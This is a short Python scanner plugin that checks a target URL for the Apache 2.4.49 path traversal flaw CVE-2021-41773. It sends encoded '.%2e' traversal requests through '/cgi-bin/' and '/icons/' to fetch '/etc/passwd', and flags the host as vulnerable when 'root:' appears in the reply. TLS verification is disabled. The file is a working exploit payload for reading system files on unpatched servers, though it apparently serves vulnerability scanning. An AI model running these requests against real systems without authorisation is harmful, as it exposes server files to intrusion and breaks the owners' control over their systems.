#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Apache 2.4.49 - Path Traversal and RCE CVE-2021-41773',

      'level'     :   'medium',

      'FOFA'      :   '',

      'ifbug'     :   False,

      'author'    :   'ppxfx',

  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd','/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd']
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    ret['url'] = url1
    res=requests.get(url=url1,headers=headers,timeout=8,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    ret['url'] = url2
    resp=requests.get(url=url2,headers=headers,timeout=8,verify=False)
    if resp.status_code == 200 and "root:" in resp.text:
      
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret